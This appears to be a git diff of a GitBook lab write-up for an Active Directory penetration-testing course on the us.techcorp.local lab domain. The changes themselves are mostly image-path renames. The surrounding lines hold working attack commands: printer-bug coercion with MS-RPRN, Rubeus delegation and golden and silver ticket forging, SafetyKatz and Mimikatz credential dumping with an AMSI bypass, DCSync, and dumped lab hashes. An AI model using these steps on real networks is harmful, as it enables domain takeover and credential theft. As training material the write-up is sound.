@@ -7,7 +7,7 @@ Enumerate following for the us.techcorp.local domain:
 * Users&#x20;
 * &#x20;Computers&#x20;
 * &#x20;Domain Administrators&#x20;
-* &#x20;Enterprise Administrators&#x20;
+* &#x20;Enterprise Administrators
 * &#x20;Kerberos Policy
 
 Use BloodHound to do it or ad module
@@ -576,7 +576,7 @@ First, we need to find out the machines in us.techcorp.local with unconstrained 
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
 Now use the credentials of webmaster extracted before to check if we have admin rights on this machine
 
@@ -592,7 +592,7 @@ On the new spawned process run invishell and use Find-PSRemotingLocalAdminAccess
 Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, we will use the printer bug to force us-dc to connect to us-web.&#x20;
 
@@ -635,7 +635,7 @@ cd C:\Users\Public
 {% endtab %}
 {% endtabs %}
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Using either of the above methods, once we have Rubeus running in the monitor mode, we can start MS-RPRN.exe to force connect us-dc to us-web and thereby abuse the printer bug:
 
@@ -643,7 +643,7 @@ Using either of the above methods, once we have Rubeus running in the monitor mo
 C:\AD\Tools\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now use the ticket to gain a session
 
@@ -674,7 +674,7 @@ Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-All
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Recall l that we extracted credentials of appsvc from us-jump, let’s use the AES256 keys for appsvc to impersonate the domain administrator - administrator and access us-mssql using those privileges. Note that we request an alternate ticket for HTTP service to be able to use WinRM.
 
@@ -703,7 +703,7 @@ Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgm
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 We are using our student VM computer object and not the studentuserx as SPN is required for RBCD
 
@@ -745,7 +745,7 @@ now use rubeus with s4u to create a ticket and open a session
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now copy the NetLoader on the target and use it to launch SafetyKatz and extract credetials
 
@@ -757,7 +757,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args %Pwn
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 helpdeskadmin aes: _f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534_
 
@@ -767,7 +767,7 @@ Now create and import a ticket to look if this user has admin privilege on some 
 Find-PSRemotingLocalAdminAccess -Domain us.techcorp.local -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Flag 29 - Golden Ticket
 
@@ -779,11 +779,11 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args golden /aes256:5e3d209
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now use the generated command to print a golden ticket nad import it
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now use PS-Remoting to dump all the domain secrets
 
@@ -799,7 +799,7 @@ Now bypass amsi and import Invoke-Mimi
 </strong>Invoke-Mimi -Command '"lsadump::lsa /patch"'
 </code></pre>
 
-<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
 
 us-dc$ rc4:  _f4492105cb24a843356945e45402073e_
 
@@ -1131,7 +1131,7 @@ Next use MS-RPRN to abuse the printer bug
 <pre data-overflow="wrap"><code><strong>C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
 </strong></code></pre>
 
-<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 And now the ticket can be imported and can launch a DCSync
 
@@ -1147,7 +1147,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadum::dcsync /u
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
 
 usvendor krbtgt rc4: _335caf1a29240a5dd318f79b6deaf03f_
 
@@ -1191,7 +1191,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /u
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
 
 and now use the ticket with rubeus "asktgs" option
 
@@ -1201,7 +1201,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /s
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 
 {% tab title="PS-Remoting" %}
@@ -1230,7 +1230,7 @@ Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -S
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now craft a silver ticket with the sid of the chosen group
 
@@ -1240,7 +1240,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /u
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now use the generated ticket to ask a tgs
 
@@ -1259,7 +1259,7 @@ Use PowerupSQL to enumerate for any database in the domain
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
-<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 So we have non-sysadmin access to us-mssql. Let's enumerate database links for us-mssql:
 
